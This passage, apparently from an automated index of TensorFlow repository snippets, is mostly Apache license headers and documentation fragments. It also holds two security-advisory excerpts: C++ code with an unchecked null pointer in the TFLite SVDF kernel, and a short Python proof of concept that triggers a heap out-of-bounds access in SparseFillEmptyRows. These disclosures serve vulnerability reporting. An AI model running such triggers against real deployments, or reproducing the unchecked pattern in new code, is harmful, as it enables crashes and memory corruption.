-----END PUBLIC KEY-----
```

----------------------------------------

TITLE: Accessing TFLite Tensor Data After Getting Variable Input (Vulnerable Code)
DESCRIPTION: This C++ snippet shows the vulnerable code inside the TFLite SVDF kernel. It retrieves a 'state' tensor using `GetVariableInput` and then immediately attempts to get its data pointer using `GetTensorData` without checking if `state` is null. This leads to a null pointer dereference if `GetVariableInput` returns null.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-155.md#_snippet_0

LANGUAGE: C++
CODE:
```
  TfLiteTensor* state = GetVariableInput(context, node, kStateTensor);
  // ...
  GetTensorData<float>(state)
```

----------------------------------------

TITLE: License Header
DESCRIPTION: This snippet contains the standard Apache License 2.0 header, indicating the terms under which the code is provided and may be used.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/metadata_writer_tutorial.ipynb#_snippet_0

LANGUAGE: python
CODE:
```
#@title Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
```

----------------------------------------

TITLE: Apache License Header
DESCRIPTION: This snippet contains the standard Apache License, Version 2.0 header as comments. It specifies the terms under which the code is distributed and used, requiring users to comply with the license.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/text_classification.ipynb#_snippet_0

LANGUAGE: python
CODE:
```
#@title Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
```

----------------------------------------

TITLE: Apache License Header Python
DESCRIPTION: Standard Apache 2.0 license header included at the beginning of the file. It specifies the terms under which the code is licensed, including distribution and usage rights, and disclaims warranties.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/authoring.ipynb#_snippet_0

LANGUAGE: python
CODE:
```
#@title Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
```

----------------------------------------

TITLE: Defining protobuf Dependency
DESCRIPTION: Specifies the exact version (4.25.3) for the 'protobuf' package and provides multiple SHA256 hashes. This requirement ensures the installation of a specific version of the Protocol Buffers library, used for serializing structured data, and validates the package's integrity.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/requirements_lock_3_12.txt#_snippet_14

LANGUAGE: Python Requirements
CODE:
```
protobuf==4.25.3 \
    --hash=sha256:19b270aeaa0099f16d3ca02628546b8baefe2955bbe23224aaf856134eccf1e4 \
    --hash=sha256:209ba4cc916bab46f64e56b85b090607a676f66b473e6b762e6f1d9d591eb2e8 \
    --hash=sha256:25b5d0b42fd000320bd7830b349e3b696435f3b329810427a6bcce6a5492cc5c \
    --hash=sha256:7c8daa26095f82482307bc717364e7c13f4f1c99659be82890dcfc215194554d \
    --hash=sha256:c053062984e61144385022e53678fbded7aea14ebb3e0305ae3592fb219ccfa4 \
    --hash=sha256:d4198877797a83cbfe9bffa3803602bbe1625dc30d8a097365dbc762e5790faa \
    --hash=sha256:e3c97a1555fd6388f857770ff8b9703083de6bf1f9274a002a332d65fbb56c8c \
    --hash=sha256:e7cb0ae90dd83727f0c0718634ed56837bfeeee29a5f82a7514c03ee1364c019 \
    --hash=sha256:f0700d54bcf45424477e46a9f0944155b46fb0639d69728739c0e47bab83f2b9
```

----------------------------------------

TITLE: Starting Python Interpreter - Shell
DESCRIPTION: Command used in a shell or terminal to launch the standard interactive Python interpreter. This allows users to run Python code line by line, including importing libraries like TensorFlow and executing commands directly.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/README.md#_snippet_2

LANGUAGE: Shell
CODE:
```
python
```

----------------------------------------

TITLE: Output of Invariant Assumption Example - Text Output
DESCRIPTION: This is the output produced by the preceding Python code snippet. It shows that 'n is 10' is printed, confirming that the `tf.equal` condition evaluated based on the initial value of `n[0]` (10) during tracing, not the value modified by the `tf.py_function`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/control_flow.md#_snippet_3

LANGUAGE: text
CODE:
```
n is 10
```

----------------------------------------

TITLE: Apache 2.0 License Header - Python
DESCRIPTION: This snippet contains the standard Apache License 2.0 header commonly found in open-source files. It specifies the terms under which the code is licensed, emphasizing freedom to use, distribute, and modify under certain conditions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/text_searcher.ipynb#_snippet_0

LANGUAGE: python
CODE:
```
#@title Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
```

----------------------------------------

TITLE: Apache License Header (Python)
DESCRIPTION: Standard Apache License 2.0 header included in the Python file. It specifies the terms under which the code is licensed and distributed, ensuring compliance with open-source usage.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/question_answer.ipynb#_snippet_0

LANGUAGE: python
CODE:
```
#@title Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
```

----------------------------------------

TITLE: License Header Apache 2.0 Python
DESCRIPTION: Standard Apache 2.0 license header block in Python comments. Declares the licensing terms under which the code is provided and used, specifying permissions and limitations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/quantization_debugger.ipynb#_snippet_0

LANGUAGE: Python
CODE:
```
#@title Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
```

----------------------------------------

TITLE: Triggering SparseFillEmptyRows Heap OOB in TensorFlow (Python)
DESCRIPTION: This Python snippet demonstrates how to trigger a heap Out-of-Bounds access vulnerability in the TensorFlow `SparseFillEmptyRows` operation. The vulnerability is triggered by providing `indices` and `values` tensors that have a different number of elements. This example uses `tf.raw_ops` to call the operation directly. Requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-172.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

data=tf.raw_ops.SparseFillEmptyRows(
  indices=[[0,0],[0,0],[0,0]],
  values=['sssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss'],
  dense_shape=[5,3],
  default_value='o')
```

----------------------------------------

TITLE: License Boilerplate
DESCRIPTION: Standard Apache License 2.0 boilerplate comment header for the file, indicating the terms under which the code is distributed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/jax_conversion/jax_to_tflite.ipynb#_snippet_0

LANGUAGE: Python
CODE:
```
#@title Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
```

----------------------------------------

TITLE: Apache License Header Python
DESCRIPTION: Standard Apache 2.0 license header comment block found at the beginning of source files, specifying the terms under which the code is licensed. It is not functional code but provides licensing information.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_quant.ipynb#_snippet_0

LANGUAGE: python
CODE:
```
#@title Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
```

----------------------------------------

TITLE: Visualizing Chunked Proto Memory View
DESCRIPTION: Shows the conceptual structure of a chunked protobuf message in memory after deserialization, illustrating how fields are organized into chunks.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/proto_splitter/g3doc/in-depth-guide.md#_snippet_0

LANGUAGE: proto
CODE:
```
chunks [
  0: B {...}
  1: C {...}
]
```